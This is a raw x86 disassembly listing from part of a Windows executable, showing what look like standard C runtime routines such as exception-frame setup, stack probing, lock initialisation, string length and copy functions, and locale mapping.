  4251fa:	jne    0x425200
  4251fc:	or     BYTE PTR [esi+0x4],0x8
  425200:	lea    eax,[esi+0xc]
  425203:	push   0xfa0
  425208:	push   eax
  425209:	call   0x4264bd
  42520e:	test   eax,eax
  425210:	pop    ecx
  425211:	pop    ecx
  425212:	je     0x4251bd
  425214:	inc    DWORD PTR [esi+0x8]
  425217:	jmp    0x425223
  425219:	or     BYTE PTR [esi+0x4],0x40
  42521d:	jmp    0x425223
  42521f:	or     BYTE PTR [esi+0x4],0x80
  425223:	inc    ebx
  425224:	cmp    ebx,0x3
  425227:	jl     0x42519f
  42522d:	push   DWORD PTR ds:0x463c48
  425233:	call   DWORD PTR ds:0x4290c4
  425239:	xor    eax,eax
  42523b:	pop    edi
  42523c:	pop    esi
  42523d:	pop    ebp
  42523e:	pop    ebx
  42523f:	add    esp,0x48
  425242:	ret    
  425243:	push   0xc
  425245:	push   0x4295f8
  42524a:	call   0x425434
  42524f:	mov    DWORD PTR [ebp-0x1c],0x42a050
  425256:	cmp    DWORD PTR [ebp-0x1c],0x42a050
  42525d:	jae    0x425281
  42525f:	and    DWORD PTR [ebp-0x4],0x0
  425263:	mov    eax,DWORD PTR [ebp-0x1c]
  425266:	mov    eax,DWORD PTR [eax]
  425268:	test   eax,eax
  42526a:	je     0x425277
  42526c:	call   eax
  42526e:	jmp    0x425277
  425270:	xor    eax,eax
  425272:	inc    eax
  425273:	ret    
  425274:	mov    esp,DWORD PTR [ebp-0x18]
  425277:	or     DWORD PTR [ebp-0x4],0xffffffff
  42527b:	add    DWORD PTR [ebp-0x1c],0x4
  42527f:	jmp    0x425256
  425281:	call   0x42546f
  425286:	ret    
  425287:	push   0xc
  425289:	push   0x429608
  42528e:	call   0x425434
  425293:	mov    DWORD PTR [ebp-0x1c],0x42a058
  42529a:	cmp    DWORD PTR [ebp-0x1c],0x42a058
  4252a1:	jae    0x4252c5
  4252a3:	and    DWORD PTR [ebp-0x4],0x0
  4252a7:	mov    eax,DWORD PTR [ebp-0x1c]
  4252aa:	mov    eax,DWORD PTR [eax]
  4252ac:	test   eax,eax
  4252ae:	je     0x4252bb
  4252b0:	call   eax
  4252b2:	jmp    0x4252bb
  4252b4:	xor    eax,eax
  4252b6:	inc    eax
  4252b7:	ret    
  4252b8:	mov    esp,DWORD PTR [ebp-0x18]
  4252bb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4252bf:	add    DWORD PTR [ebp-0x1c],0x4
  4252c3:	jmp    0x42529a
  4252c5:	call   0x42546f
  4252ca:	ret    
  4252cb:	call   0x425506
  4252d0:	mov    eax,ds:0x462dfc
  4252d5:	cmp    eax,0xffffffff
  4252d8:	je     0x4252e8
  4252da:	push   eax
  4252db:	call   DWORD PTR ds:0x4290d0
  4252e1:	or     DWORD PTR ds:0x462dfc,0xffffffff
  4252e8:	ret    
  4252e9:	push   ebx
  4252ea:	push   esi
  4252eb:	call   DWORD PTR ds:0x429030
  4252f1:	push   DWORD PTR ds:0x462dfc
  4252f7:	mov    ebx,eax
  4252f9:	call   DWORD PTR ds:0x4290e0
  4252ff:	mov    esi,eax
  425301:	test   esi,esi
  425303:	jne    0x42534e
  425305:	push   0x88
  42530a:	push   0x1
  42530c:	call   0x426548
  425311:	mov    esi,eax
  425313:	test   esi,esi
  425315:	pop    ecx
  425316:	pop    ecx
  425317:	je     0x425346
  425319:	push   esi
  42531a:	push   DWORD PTR ds:0x462dfc
  425320:	call   DWORD PTR ds:0x4290dc
  425326:	test   eax,eax
  425328:	je     0x425346
  42532a:	mov    DWORD PTR [esi+0x54],0x462d50
  425331:	mov    DWORD PTR [esi+0x14],0x1
  425338:	call   DWORD PTR ds:0x4290d8
  42533e:	or     DWORD PTR [esi+0x4],0xffffffff
  425342:	mov    DWORD PTR [esi],eax
  425344:	jmp    0x42534e
  425346:	push   0x10
  425348:	call   0x4244fc
  42534d:	pop    ecx
  42534e:	push   ebx
  42534f:	call   DWORD PTR ds:0x4290d4
  425355:	mov    eax,esi
  425357:	pop    esi
  425358:	pop    ebx
  425359:	ret    
  42535a:	call   0x4254bd
  42535f:	test   eax,eax
  425361:	je     0x425373
  425363:	call   DWORD PTR ds:0x4290e4
  425369:	cmp    eax,0xffffffff
  42536c:	mov    ds:0x462dfc,eax
  425371:	jne    0x42537b
  425373:	call   0x4252cb
  425378:	xor    eax,eax
  42537a:	ret    
  42537b:	push   esi
  42537c:	push   0x88
  425381:	push   0x1
  425383:	call   0x426548
  425388:	mov    esi,eax
  42538a:	test   esi,esi
  42538c:	pop    ecx
  42538d:	pop    ecx
  42538e:	je     0x4253c0
  425390:	push   esi
  425391:	push   DWORD PTR ds:0x462dfc
  425397:	call   DWORD PTR ds:0x4290dc
  42539d:	test   eax,eax
  42539f:	je     0x4253c0
  4253a1:	mov    DWORD PTR [esi+0x54],0x462d50
  4253a8:	mov    DWORD PTR [esi+0x14],0x1
  4253af:	call   DWORD PTR ds:0x4290d8
  4253b5:	or     DWORD PTR [esi+0x4],0xffffffff
  4253b9:	mov    DWORD PTR [esi],eax
  4253bb:	xor    eax,eax
  4253bd:	inc    eax
  4253be:	pop    esi
  4253bf:	ret    
  4253c0:	call   0x4252cb
  4253c5:	xor    eax,eax
  4253c7:	pop    esi
  4253c8:	ret    
  4253c9:	cmp    DWORD PTR ds:0x4635c4,0x2
  4253d0:	jne    0x4253df
  4253d2:	cmp    DWORD PTR ds:0x4635d0,0x5
  4253d9:	jb     0x4253df
  4253db:	xor    eax,eax
  4253dd:	inc    eax
  4253de:	ret    
  4253df:	push   0x3
  4253e1:	pop    eax
  4253e2:	ret    
  4253e3:	xor    eax,eax
  4253e5:	cmp    DWORD PTR [esp+0x4],eax
  4253e9:	push   0x0
  4253eb:	sete   al
  4253ee:	push   0x1000
  4253f3:	push   eax
  4253f4:	call   DWORD PTR ds:0x429040
  4253fa:	test   eax,eax
  4253fc:	mov    ds:0x463c40,eax
  425401:	je     0x42542d
  425403:	call   0x4253c9
  425408:	cmp    eax,0x3
  42540b:	mov    ds:0x463c44,eax
  425410:	jne    0x425430
  425412:	push   0x3f8
  425417:	call   0x4267ca
  42541c:	test   eax,eax
  42541e:	pop    ecx
  42541f:	jne    0x425430
  425421:	push   DWORD PTR ds:0x463c40
  425427:	call   DWORD PTR ds:0x4290e8
  42542d:	xor    eax,eax
  42542f:	ret    
  425430:	xor    eax,eax
  425432:	inc    eax
  425433:	ret    
  425434:	push   0x4272f8
  425439:	mov    eax,fs:0x0
  42543f:	push   eax
  425440:	mov    eax,DWORD PTR [esp+0x10]
  425444:	mov    DWORD PTR [esp+0x10],ebp
  425448:	lea    ebp,[esp+0x10]
  42544c:	sub    esp,eax
  42544e:	push   ebx
  42544f:	push   esi
  425450:	push   edi
  425451:	mov    eax,DWORD PTR [ebp-0x8]
  425454:	mov    DWORD PTR [ebp-0x18],esp
  425457:	push   eax
  425458:	mov    eax,DWORD PTR [ebp-0x4]
  42545b:	mov    DWORD PTR [ebp-0x4],0xffffffff
  425462:	mov    DWORD PTR [ebp-0x8],eax
  425465:	lea    eax,[ebp-0x10]
  425468:	mov    fs:0x0,eax
  42546e:	ret    
  42546f:	mov    ecx,DWORD PTR [ebp-0x10]
  425472:	mov    DWORD PTR fs:0x0,ecx
  425479:	pop    ecx
  42547a:	pop    edi
  42547b:	pop    esi
  42547c:	pop    ebx
  42547d:	leave  
  42547e:	push   ecx
  42547f:	ret    
  425480:	cmp    eax,0x1000
  425485:	jae    0x425495
  425487:	neg    eax
  425489:	add    eax,esp
  42548b:	add    eax,0x4
  42548e:	test   DWORD PTR [eax],eax
  425490:	xchg   esp,eax
  425491:	mov    eax,DWORD PTR [eax]
  425493:	push   eax
  425494:	ret    
  425495:	push   ecx
  425496:	lea    ecx,[esp+0x8]
  42549a:	sub    ecx,0x1000
  4254a0:	sub    eax,0x1000
  4254a5:	test   DWORD PTR [ecx],eax
  4254a7:	cmp    eax,0x1000
  4254ac:	jae    0x42549a
  4254ae:	sub    ecx,eax
  4254b0:	mov    eax,esp
  4254b2:	test   DWORD PTR [ecx],eax
  4254b4:	mov    esp,ecx
  4254b6:	mov    ecx,DWORD PTR [eax]
  4254b8:	mov    eax,DWORD PTR [eax+0x4]
  4254bb:	push   eax
  4254bc:	ret    
  4254bd:	push   esi
  4254be:	push   edi
  4254bf:	xor    esi,esi
  4254c1:	mov    edi,0x463720
  4254c6:	cmp    DWORD PTR [esi*8+0x462e14],0x1
  4254ce:	jne    0x4254ee
  4254d0:	lea    eax,[esi*8+0x462e10]
  4254d7:	mov    DWORD PTR [eax],edi
  4254d9:	push   0xfa0
  4254de:	push   DWORD PTR [eax]
  4254e0:	add    edi,0x18
  4254e3:	call   0x4264bd
  4254e8:	test   eax,eax
  4254ea:	pop    ecx
  4254eb:	pop    ecx
  4254ec:	je     0x4254fa
  4254ee:	inc    esi
  4254ef:	cmp    esi,0x24
  4254f2:	jl     0x4254c6
  4254f4:	xor    eax,eax
  4254f6:	inc    eax
  4254f7:	pop    edi
  4254f8:	pop    esi
  4254f9:	ret    
  4254fa:	and    DWORD PTR [esi*8+0x462e10],0x0
  425502:	xor    eax,eax
  425504:	jmp    0x4254f7
  425506:	push   ebx
  425507:	mov    ebx,DWORD PTR ds:0x4290cc
  42550d:	push   esi
  42550e:	mov    esi,0x462e10
  425513:	push   edi
  425514:	mov    edi,DWORD PTR [esi]
  425516:	test   edi,edi
  425518:	je     0x42552d
  42551a:	cmp    DWORD PTR [esi+0x4],0x1
  42551e:	je     0x42552d
  425520:	push   edi
  425521:	call   ebx
  425523:	push   edi
  425524:	call   0x42603a
  425529:	and    DWORD PTR [esi],0x0
  42552c:	pop    ecx
  42552d:	add    esi,0x8
  425530:	cmp    esi,0x462f30
  425536:	jl     0x425514
  425538:	mov    esi,0x462e10
  42553d:	pop    edi
  42553e:	mov    eax,DWORD PTR [esi]
  425540:	test   eax,eax
  425542:	je     0x42554d
  425544:	cmp    DWORD PTR [esi+0x4],0x1
  425548:	jne    0x42554d
  42554a:	push   eax
  42554b:	call   ebx
  42554d:	add    esi,0x8
  425550:	cmp    esi,0x462f30
  425556:	jl     0x42553e
  425558:	pop    esi
  425559:	pop    ebx
  42555a:	ret    
  42555b:	push   ebp
  42555c:	mov    ebp,esp
  42555e:	mov    eax,DWORD PTR [ebp+0x8]
  425561:	push   DWORD PTR [eax*8+0x462e10]
  425568:	call   DWORD PTR ds:0x4290f0
  42556e:	pop    ebp
  42556f:	ret    
  425570:	push   ebp
  425571:	mov    ebp,esp
  425573:	push   esi
  425574:	mov    esi,DWORD PTR [ebp+0x8]
  425577:	lea    esi,[esi*8+0x462e10]
  42557e:	cmp    DWORD PTR [esi],0x0
  425581:	je     0x425588
  425583:	xor    eax,eax
  425585:	inc    eax
  425586:	jmp    0x4255ec
  425588:	push   edi
  425589:	push   0x18
  42558b:	call   0x426152
  425590:	mov    edi,eax
  425592:	test   edi,edi
  425594:	pop    ecx
  425595:	jne    0x4255a6
  425597:	call   0x4273d0
  42559c:	mov    DWORD PTR [eax],0xc
  4255a2:	xor    eax,eax
  4255a4:	jmp    0x4255eb
  4255a6:	push   0xa
  4255a8:	call   0x4255ef
  4255ad:	cmp    DWORD PTR [esi],0x0
  4255b0:	pop    ecx
  4255b1:	jne    0x4255d9
  4255b3:	push   0xfa0
  4255b8:	push   edi
  4255b9:	call   0x4264bd
  4255be:	test   eax,eax
  4255c0:	pop    ecx
  4255c1:	pop    ecx
  4255c2:	jne    0x4255d5
  4255c4:	push   edi
  4255c5:	call   0x42603a
  4255ca:	push   0xa
  4255cc:	call   0x42555b
  4255d1:	pop    ecx
  4255d2:	pop    ecx
  4255d3:	jmp    0x425597
  4255d5:	mov    DWORD PTR [esi],edi
  4255d7:	jmp    0x4255e0
  4255d9:	push   edi
  4255da:	call   0x42603a
  4255df:	pop    ecx
  4255e0:	push   0xa
  4255e2:	call   0x42555b
  4255e7:	xor    eax,eax
  4255e9:	pop    ecx
  4255ea:	inc    eax
  4255eb:	pop    edi
  4255ec:	pop    esi
  4255ed:	pop    ebp
  4255ee:	ret    
  4255ef:	push   ebp
  4255f0:	mov    ebp,esp
  4255f2:	mov    eax,DWORD PTR [ebp+0x8]
  4255f5:	push   esi
  4255f6:	lea    esi,[eax*8+0x462e10]
  4255fd:	cmp    DWORD PTR [esi],0x0
  425600:	jne    0x425615
  425602:	push   eax
  425603:	call   0x425570
  425608:	test   eax,eax
  42560a:	pop    ecx
  42560b:	jne    0x425615
  42560d:	push   0x11
  42560f:	call   0x4244fc
  425614:	pop    ecx
  425615:	push   DWORD PTR [esi]
  425617:	call   DWORD PTR ds:0x4290f4
  42561d:	pop    esi
  42561e:	pop    ebp
  42561f:	ret    
  425620:	push   esi
  425621:	push   DWORD PTR ds:0x463d68
  425627:	call   0x427586
  42562c:	pop    ecx
  42562d:	mov    ecx,DWORD PTR ds:0x463d64
  425633:	mov    esi,eax
  425635:	mov    eax,ds:0x463d68
  42563a:	mov    edx,ecx
  42563c:	sub    edx,eax
  42563e:	add    edx,0x4
  425641:	cmp    esi,edx
  425643:	jae    0x425693
  425645:	mov    ecx,0x800
  42564a:	cmp    esi,ecx
  42564c:	jae    0x425650
  42564e:	mov    ecx,esi
  425650:	add    ecx,esi
  425652:	push   ecx
  425653:	push   eax
  425654:	call   0x4273d9
  425659:	test   eax,eax
  42565b:	pop    ecx
  42565c:	pop    ecx
  42565d:	jne    0x425676
  42565f:	add    esi,0x10
  425662:	push   esi
  425663:	push   DWORD PTR ds:0x463d68
  425669:	call   0x4273d9
  42566e:	test   eax,eax
  425670:	pop    ecx
  425671:	pop    ecx
  425672:	jne    0x425676
  425674:	pop    esi
  425675:	ret    
  425676:	mov    ecx,DWORD PTR ds:0x463d64
  42567c:	sub    ecx,DWORD PTR ds:0x463d68
  425682:	mov    ds:0x463d68,eax
  425687:	sar    ecx,0x2
  42568a:	lea    ecx,[eax+ecx*4]
  42568d:	mov    DWORD PTR ds:0x463d64,ecx
  425693:	mov    DWORD PTR [ecx],edi
  425695:	add    DWORD PTR ds:0x463d64,0x4
  42569c:	mov    eax,edi
  42569e:	pop    esi
  42569f:	ret    
  4256a0:	push   0x80
  4256a5:	call   0x426152
  4256aa:	test   eax,eax
  4256ac:	pop    ecx
  4256ad:	mov    ds:0x463d68,eax
  4256b2:	jne    0x4256b8
  4256b4:	push   0x18
  4256b6:	pop    eax
  4256b7:	ret    
  4256b8:	and    DWORD PTR [eax],0x0
  4256bb:	mov    eax,ds:0x463d68
  4256c0:	mov    ds:0x463d64,eax
  4256c5:	xor    eax,eax
  4256c7:	ret    
  4256c8:	push   0xc
  4256ca:	push   0x429618
  4256cf:	call   0x425434
  4256d4:	call   0x424747
  4256d9:	and    DWORD PTR [ebp-0x4],0x0
  4256dd:	mov    edi,DWORD PTR [ebp+0x8]
  4256e0:	call   0x425620
  4256e5:	mov    DWORD PTR [ebp-0x1c],eax
  4256e8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4256ec:	call   0x4256fa
  4256f1:	mov    eax,DWORD PTR [ebp-0x1c]
  4256f4:	call   0x42546f
  4256f9:	ret    
  4256fa:	call   0x424750
  4256ff:	ret    
  425700:	push   DWORD PTR [esp+0x4]
  425704:	call   0x4256c8
  425709:	neg    eax
  42570b:	sbb    eax,eax
  42570d:	neg    eax
  42570f:	pop    ecx
  425710:	dec    eax
  425711:	ret    
  425712:	push   ebp
  425713:	mov    ebp,esp
  425715:	sub    esp,0x10
  425718:	push   ebx
  425719:	xor    ebx,ebx
  42571b:	cmp    DWORD PTR ds:0x463870,ebx
  425721:	push   esi
  425722:	push   edi
  425723:	jne    0x425792
  425725:	push   0x429688
  42572a:	call   DWORD PTR ds:0x4290f8
  425730:	mov    edi,eax
  425732:	cmp    edi,ebx
  425734:	je     0x4257cd
  42573a:	mov    esi,DWORD PTR ds:0x429028
  425740:	push   0x42967c
  425745:	push   edi
  425746:	call   esi
  425748:	test   eax,eax
  42574a:	mov    ds:0x463870,eax
  42574f:	je     0x4257cd
  425751:	push   0x42966c
  425756:	push   edi
  425757:	call   esi
  425759:	push   0x429658
  42575e:	push   edi
  42575f:	mov    ds:0x463874,eax
  425764:	call   esi
  425766:	cmp    DWORD PTR ds:0x4635c4,0x2
  42576d:	mov    ds:0x463878,eax
  425772:	jne    0x425792
  425774:	push   0x42963c
  425779:	push   edi
  42577a:	call   esi
  42577c:	test   eax,eax
  42577e:	mov    ds:0x463880,eax
  425783:	je     0x425792
  425785:	push   0x429624
  42578a:	push   edi
  42578b:	call   esi
  42578d:	mov    ds:0x46387c,eax
  425792:	mov    eax,ds:0x46387c
  425797:	test   eax,eax
  425799:	je     0x4257d7
  42579b:	call   eax
  42579d:	test   eax,eax
  42579f:	je     0x4257be
  4257a1:	lea    ecx,[ebp-0x4]
  4257a4:	push   ecx
  4257a5:	push   0xc
  4257a7:	lea    ecx,[ebp-0x10]
  4257aa:	push   ecx
  4257ab:	push   0x1
  4257ad:	push   eax
  4257ae:	call   DWORD PTR ds:0x463880
  4257b4:	test   eax,eax
  4257b6:	je     0x4257be
  4257b8:	test   BYTE PTR [ebp-0x8],0x1
  4257bc:	jne    0x4257d7
  4257be:	cmp    DWORD PTR ds:0x4635d0,0x4
  4257c5:	jb     0x4257d1
  4257c7:	or     BYTE PTR [ebp+0x12],0x20
  4257cb:	jmp    0x4257f6
  4257cd:	xor    eax,eax
  4257cf:	jmp    0x425806
  4257d1:	or     BYTE PTR [ebp+0x12],0x4
  4257d5:	jmp    0x4257f6
  4257d7:	mov    eax,ds:0x463874
  4257dc:	test   eax,eax
  4257de:	je     0x4257f6
  4257e0:	call   eax
  4257e2:	mov    ebx,eax
  4257e4:	test   ebx,ebx
  4257e6:	je     0x4257f6
  4257e8:	mov    eax,ds:0x463878
  4257ed:	test   eax,eax
  4257ef:	je     0x4257f6
  4257f1:	push   ebx
  4257f2:	call   eax
  4257f4:	mov    ebx,eax
  4257f6:	push   DWORD PTR [ebp+0x10]
  4257f9:	push   DWORD PTR [ebp+0xc]
  4257fc:	push   DWORD PTR [ebp+0x8]
  4257ff:	push   ebx
  425800:	call   DWORD PTR ds:0x463870
  425806:	pop    edi
  425807:	pop    esi
  425808:	pop    ebx
  425809:	leave  
  42580a:	ret    
  42580b:	int3   
  42580c:	int3   
  42580d:	int3   
  42580e:	int3   
  42580f:	int3   
  425810:	push   edi
  425811:	mov    edi,DWORD PTR [esp+0x8]
  425815:	jmp    0x425885
  425817:	lea    esp,[esp+0x0]
  42581e:	mov    edi,edi
  425820:	mov    ecx,DWORD PTR [esp+0x4]
  425824:	push   edi
  425825:	test   ecx,0x3
  42582b:	je     0x425840
  42582d:	mov    al,BYTE PTR [ecx]
  42582f:	add    ecx,0x1
  425832:	test   al,al
  425834:	je     0x425873
  425836:	test   ecx,0x3
  42583c:	jne    0x42582d
  42583e:	mov    edi,edi
  425840:	mov    eax,DWORD PTR [ecx]
  425842:	mov    edx,0x7efefeff
  425847:	add    edx,eax
  425849:	xor    eax,0xffffffff
  42584c:	xor    eax,edx
  42584e:	add    ecx,0x4
  425851:	test   eax,0x81010100
  425856:	je     0x425840
  425858:	mov    eax,DWORD PTR [ecx-0x4]
  42585b:	test   al,al
  42585d:	je     0x425882
  42585f:	test   ah,ah
  425861:	je     0x42587d
  425863:	test   eax,0xff0000
  425868:	je     0x425878
  42586a:	test   eax,0xff000000
  42586f:	je     0x425873
  425871:	jmp    0x425840
  425873:	lea    edi,[ecx-0x1]
  425876:	jmp    0x425885
  425878:	lea    edi,[ecx-0x2]
  42587b:	jmp    0x425885
  42587d:	lea    edi,[ecx-0x3]
  425880:	jmp    0x425885
  425882:	lea    edi,[ecx-0x4]
  425885:	mov    ecx,DWORD PTR [esp+0xc]
  425889:	test   ecx,0x3
  42588f:	je     0x4258ae
  425891:	mov    dl,BYTE PTR [ecx]
  425893:	add    ecx,0x1
  425896:	test   dl,dl
  425898:	je     0x425900
  42589a:	mov    BYTE PTR [edi],dl
  42589c:	add    edi,0x1
  42589f:	test   ecx,0x3
  4258a5:	jne    0x425891
  4258a7:	jmp    0x4258ae
  4258a9:	mov    DWORD PTR [edi],edx
  4258ab:	add    edi,0x4
  4258ae:	mov    edx,0x7efefeff
  4258b3:	mov    eax,DWORD PTR [ecx]
  4258b5:	add    edx,eax
  4258b7:	xor    eax,0xffffffff
  4258ba:	xor    eax,edx
  4258bc:	mov    edx,DWORD PTR [ecx]
  4258be:	add    ecx,0x4
  4258c1:	test   eax,0x81010100
  4258c6:	je     0x4258a9
  4258c8:	test   dl,dl
  4258ca:	je     0x425900
  4258cc:	test   dh,dh
  4258ce:	je     0x4258f7
  4258d0:	test   edx,0xff0000
  4258d6:	je     0x4258ea
  4258d8:	test   edx,0xff000000
  4258de:	je     0x4258e2
  4258e0:	jmp    0x4258a9
  4258e2:	mov    DWORD PTR [edi],edx
  4258e4:	mov    eax,DWORD PTR [esp+0x8]
  4258e8:	pop    edi
  4258e9:	ret    
  4258ea:	mov    WORD PTR [edi],dx
  4258ed:	mov    eax,DWORD PTR [esp+0x8]
  4258f1:	mov    BYTE PTR [edi+0x2],0x0
  4258f5:	pop    edi
  4258f6:	ret    
  4258f7:	mov    WORD PTR [edi],dx
  4258fa:	mov    eax,DWORD PTR [esp+0x8]
  4258fe:	pop    edi
  4258ff:	ret    
  425900:	mov    BYTE PTR [edi],dl
  425902:	mov    eax,DWORD PTR [esp+0x8]
  425906:	pop    edi
  425907:	ret    
  425908:	int3   
  425909:	int3   
  42590a:	int3   
  42590b:	int3   
  42590c:	int3   
  42590d:	int3   
  42590e:	int3   
  42590f:	int3   
  425910:	mov    ecx,DWORD PTR [esp+0xc]
  425914:	push   edi
  425915:	test   ecx,ecx
  425917:	je     0x4259af
  42591d:	push   esi
  42591e:	push   ebx
  42591f:	mov    ebx,ecx
  425921:	mov    esi,DWORD PTR [esp+0x14]
  425925:	test   esi,0x3
  42592b:	mov    edi,DWORD PTR [esp+0x10]
  42592f:	jne    0x42593c
  425931:	shr    ecx,0x2
  425934:	jne    0x4259bf
  42593a:	jmp    0x425963
  42593c:	mov    al,BYTE PTR [esi]
  42593e:	add    esi,0x1
  425941:	mov    BYTE PTR [edi],al
  425943:	add    edi,0x1
  425946:	sub    ecx,0x1
  425949:	je     0x425976
  42594b:	test   al,al
  42594d:	je     0x42597e
  42594f:	test   esi,0x3
  425955:	jne    0x42593c
  425957:	mov    ebx,ecx
  425959:	shr    ecx,0x2
  42595c:	jne    0x4259bf
  42595e:	and    ebx,0x3
  425961:	je     0x425976
  425963:	mov    al,BYTE PTR [esi]
  425965:	add    esi,0x1
  425968:	mov    BYTE PTR [edi],al
  42596a:	add    edi,0x1
  42596d:	test   al,al
  42596f:	je     0x4259a8
  425971:	sub    ebx,0x1
  425974:	jne    0x425963
  425976:	mov    eax,DWORD PTR [esp+0x10]
  42597a:	pop    ebx
  42597b:	pop    esi
  42597c:	pop    edi
  42597d:	ret    
  42597e:	test   edi,0x3
  425984:	je     0x42599c
  425986:	mov    BYTE PTR [edi],al
  425988:	add    edi,0x1
  42598b:	sub    ecx,0x1
  42598e:	je     0x425a2c
  425994:	test   edi,0x3
  42599a:	jne    0x425986
  42599c:	mov    ebx,ecx
  42599e:	shr    ecx,0x2
  4259a1:	jne    0x425a17
  4259a3:	mov    BYTE PTR [edi],al
  4259a5:	add    edi,0x1
  4259a8:	sub    ebx,0x1
  4259ab:	jne    0x4259a3
  4259ad:	pop    ebx
  4259ae:	pop    esi
  4259af:	mov    eax,DWORD PTR [esp+0x8]
  4259b3:	pop    edi
  4259b4:	ret    
  4259b5:	mov    DWORD PTR [edi],edx
  4259b7:	add    edi,0x4
  4259ba:	sub    ecx,0x1
  4259bd:	je     0x42595e
  4259bf:	mov    edx,0x7efefeff
  4259c4:	mov    eax,DWORD PTR [esi]
  4259c6:	add    edx,eax
  4259c8:	xor    eax,0xffffffff
  4259cb:	xor    eax,edx
  4259cd:	mov    edx,DWORD PTR [esi]
  4259cf:	add    esi,0x4
  4259d2:	test   eax,0x81010100
  4259d7:	je     0x4259b5
  4259d9:	test   dl,dl
  4259db:	je     0x425a09
  4259dd:	test   dh,dh
  4259df:	je     0x4259ff
  4259e1:	test   edx,0xff0000
  4259e7:	je     0x4259f5
  4259e9:	test   edx,0xff000000
  4259ef:	jne    0x4259b5
  4259f1:	mov    DWORD PTR [edi],edx
  4259f3:	jmp    0x425a0d
  4259f5:	and    edx,0xffff
  4259fb:	mov    DWORD PTR [edi],edx
  4259fd:	jmp    0x425a0d
  4259ff:	and    edx,0xff
  425a05:	mov    DWORD PTR [edi],edx
  425a07:	jmp    0x425a0d
  425a09:	xor    edx,edx
  425a0b:	mov    DWORD PTR [edi],edx
  425a0d:	add    edi,0x4
  425a10:	xor    eax,eax
  425a12:	sub    ecx,0x1
  425a15:	je     0x425a23
  425a17:	xor    eax,eax
  425a19:	mov    DWORD PTR [edi],eax
  425a1b:	add    edi,0x4
  425a1e:	sub    ecx,0x1
  425a21:	jne    0x425a19
  425a23:	and    ebx,0x3
  425a26:	jne    0x4259a3
  425a2c:	mov    eax,DWORD PTR [esp+0x10]
  425a30:	pop    ebx
  425a31:	pop    esi
  425a32:	pop    edi
  425a33:	ret    
  425a34:	int3   
  425a35:	int3   
  425a36:	int3   
  425a37:	int3   
  425a38:	int3   
  425a39:	int3   
  425a3a:	int3   
  425a3b:	int3   
  425a3c:	int3   
  425a3d:	int3   
  425a3e:	int3   
  425a3f:	int3   
  425a40:	mov    ecx,DWORD PTR [esp+0x4]
  425a44:	test   ecx,0x3
  425a4a:	je     0x425a70
  425a4c:	mov    al,BYTE PTR [ecx]
  425a4e:	add    ecx,0x1
  425a51:	test   al,al
  425a53:	je     0x425aa3
  425a55:	test   ecx,0x3
  425a5b:	jne    0x425a4c
  425a5d:	add    eax,0x0
  425a62:	lea    esp,[esp+0x0]
  425a69:	lea    esp,[esp+0x0]
  425a70:	mov    eax,DWORD PTR [ecx]
  425a72:	mov    edx,0x7efefeff
  425a77:	add    edx,eax
  425a79:	xor    eax,0xffffffff
  425a7c:	xor    eax,edx
  425a7e:	add    ecx,0x4
  425a81:	test   eax,0x81010100
  425a86:	je     0x425a70
  425a88:	mov    eax,DWORD PTR [ecx-0x4]
  425a8b:	test   al,al
  425a8d:	je     0x425ac1
  425a8f:	test   ah,ah
  425a91:	je     0x425ab7
  425a93:	test   eax,0xff0000
  425a98:	je     0x425aad
  425a9a:	test   eax,0xff000000
  425a9f:	je     0x425aa3
  425aa1:	jmp    0x425a70
  425aa3:	lea    eax,[ecx-0x1]
  425aa6:	mov    ecx,DWORD PTR [esp+0x4]
  425aaa:	sub    eax,ecx
  425aac:	ret    
  425aad:	lea    eax,[ecx-0x2]
  425ab0:	mov    ecx,DWORD PTR [esp+0x4]
  425ab4:	sub    eax,ecx
  425ab6:	ret    
  425ab7:	lea    eax,[ecx-0x3]
  425aba:	mov    ecx,DWORD PTR [esp+0x4]
  425abe:	sub    eax,ecx
  425ac0:	ret    
  425ac1:	lea    eax,[ecx-0x4]
  425ac4:	mov    ecx,DWORD PTR [esp+0x4]
  425ac8:	sub    eax,ecx
  425aca:	ret    
  425acb:	push   0x8
  425acd:	push   0x429698
  425ad2:	call   0x425434
  425ad7:	and    DWORD PTR [ebp-0x4],0x0
  425adb:	push   0x0
  425add:	push   0x1
  425adf:	call   0x427652
  425ae4:	pop    ecx
  425ae5:	pop    ecx
  425ae6:	jmp    0x425aef
  425ae8:	xor    eax,eax
  425aea:	inc    eax
  425aeb:	ret    
  425aec:	mov    esp,DWORD PTR [ebp-0x18]
  425aef:	or     DWORD PTR [ebp-0x4],0xffffffff
  425af3:	push   0x3
  425af5:	call   DWORD PTR ds:0x42909c
  425afb:	int3   
  425afc:	cmp    ecx,DWORD PTR ds:0x462f30
  425b02:	jne    0x425b05
  425b04:	ret    
  425b05:	jmp    0x425acb
  425b0a:	movzx  eax,BYTE PTR [esp+0x4]
  425b0f:	mov    cl,BYTE PTR [esp+0xc]
  425b13:	test   BYTE PTR [eax+0x463a21],cl
  425b19:	jne    0x425b37
  425b1b:	cmp    DWORD PTR [esp+0x8],0x0
  425b20:	je     0x425b30
  425b22:	movzx  eax,WORD PTR [eax*2+0x429a92]
  425b2a:	and    eax,DWORD PTR [esp+0x8]
  425b2e:	jmp    0x425b32
  425b30:	xor    eax,eax
  425b32:	test   eax,eax
  425b34:	jne    0x425b37
  425b36:	ret    
  425b37:	xor    eax,eax
  425b39:	inc    eax
  425b3a:	ret    
  425b3b:	push   0x4
  425b3d:	push   0x0
  425b3f:	push   DWORD PTR [esp+0xc]
  425b43:	call   0x425b0a
  425b48:	add    esp,0xc
  425b4b:	ret    
  425b4c:	sub    eax,0x3a4
  425b51:	je     0x425b75
  425b53:	sub    eax,0x4
  425b56:	je     0x425b6f
  425b58:	sub    eax,0xd
  425b5b:	je     0x425b69
  425b5d:	dec    eax
  425b5e:	je     0x425b63
  425b60:	xor    eax,eax
  425b62:	ret    
  425b63:	mov    eax,0x404
  425b68:	ret    
  425b69:	mov    eax,0x412
  425b6e:	ret    
  425b6f:	mov    eax,0x804
  425b74:	ret    
  425b75:	mov    eax,0x411
  425b7a:	ret    
  425b7b:	push   edi
  425b7c:	push   0x40
  425b7e:	xor    eax,eax
  425b80:	pop    ecx
  425b81:	mov    edi,0x463a20
  425b86:	rep stos DWORD PTR es:[edi],eax
  425b88:	stos   BYTE PTR es:[edi],al
  425b89:	xor    eax,eax
  425b8b:	mov    ds:0x463b24,eax
  425b90:	mov    ds:0x463a1c,eax
  425b95:	mov    ds:0x463a14,eax
  425b9a:	mov    edi,0x463b30
  425b9f:	stos   DWORD PTR es:[edi],eax
